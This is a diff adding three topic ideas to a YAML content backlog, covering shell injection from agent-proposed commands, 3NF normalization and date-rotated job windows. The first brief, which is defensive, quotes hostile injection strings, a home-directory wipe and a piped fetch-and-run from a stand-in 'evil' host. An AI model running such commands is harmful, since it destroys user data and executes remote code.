@@ -3726,3 +3726,40 @@ backlog:
     priority: P2
     status: done
     published: /posts/2026/08/28/gate-job-reads-a-boolean-holds-a-key/
+
+  # --- content-scout topic ideas (auto-appended; humans may edit/reprioritize) ---
+  # Each carries the source it-journey.dev page it was inspired by; grow-lifehacker
+  # links that page in the published piece. Default P3 — human items outrank these.
+  - id: SRC-109
+    kind: hack
+    title: "Never run an agent's command with shell=True: argv-form subprocess and an allowlist that fails closed"
+    brief: "Your helpful robot proposes a command, your glue script runs it with `subprocess.run(cmd, shell=True)`, and now a model-generated string carrying `; rm -rf ~` or `$(curl evil | sh)` is a shell-metacharacter buffet running at your privileges. The three mitigations that actually matter: pass argv-form (`[\"git\",\"status\"]`, never one big string) so there is no shell to inject into; allowlist the executables you'll dispatch and reject everything else, failing CLOSED on an unknown verb rather than 'probably fine'; and treat every field of the agent's output as hostile data — validate its type before you act on it, because an unknown claim type is a refusal, not a default. Reproducible with a ten-line Python harness and one crafted 'command'; the `shell=True` version that cheerfully runs the injection stays in, because that's the one that ships."
+    voice: how-to-practical
+    priority: P3
+    status: todo
+    source: content-scout
+    source_url: https://it-journey.dev/quests/1010/self-operating-website-05-the-content-forge/
+    source_title: "The Content Forge (Self-Operating Website 05)"
+    fingerprint: 80b97bb7b4dd
+  - id: SRC-110
+    kind: hack
+    title: "The column that lies to half your rows: kill the 3NF transitive dependency before it causes an update anomaly"
+    brief: "You dropped `zip`, `city`, and `state` straight onto the orders table because it was convenient, and the schema is now in 2NF and quietly wrong: city depends on zip, not on the order, so the day a zip's city name changes you update some rows, miss others, and two orders from the same address disagree forever. That's a transitive dependency, and 3NF exists to delete it — lift zip→city→state into their own table and reference it, so the fact lives in exactly one place and one UPDATE fixes every order. The honest gotcha that stays in: normalization is not a religion, and you will sometimes denormalize ON PURPOSE for read speed — but then YOU own keeping the copies in sync, so make that a decision you wrote down, not one you discover in a support ticket. Reproducible in a throwaway Postgres by changing one city and counting the rows that didn't move."
+    voice: how-to-practical
+    priority: P3
+    status: todo
+    source: content-scout
+    source_url: https://it-journey.dev/quests/0110/data-modeling/
+    source_title: "Data Modeling: Schema Design and Database Relationships"
+    fingerprint: 09ad22a408fd
+  - id: SRC-111
+    kind: hack
+    title: "Sweep a list too big for one run: date-rotate the window with toordinal() % N (pin the date or two jobs walk different slices)"
+    brief: "A scheduled job that must check 300 things but only affords 30 API calls a run doesn't need a queue or shared state — it needs a deterministic window. Number the items, pick today's slice with `datetime.date.today().toordinal() % num_windows`, and cut it with `items[i*n:(i+1)*n]`; over `num_windows` days you cover the whole list gap-free and overlap-free, and every run is reproducible from the date alone. Two failures stay in: if a 'plan' step and a 'do' step each call `today()` and the clock rolls past midnight between them, they walk DIFFERENT windows and silently skip a slice — compute the date once and pass it down; and 'this run passed' is not 'the whole list is covered', so keep a small ledger of per-item verdicts with a freshness window (drop verdicts older than N days) or a stale pass will certify a sweep that never actually finished."
+    voice: how-to-practical
+    priority: P3
+    status: todo
+    source: content-scout
+    source_url: https://it-journey.dev/quests/1010/ouroboros-loop-05-the-mana-ledger/
+    source_title: "The Mana Ledger (Ouroboros Loop 05)"
+    fingerprint: eb3010c3d628
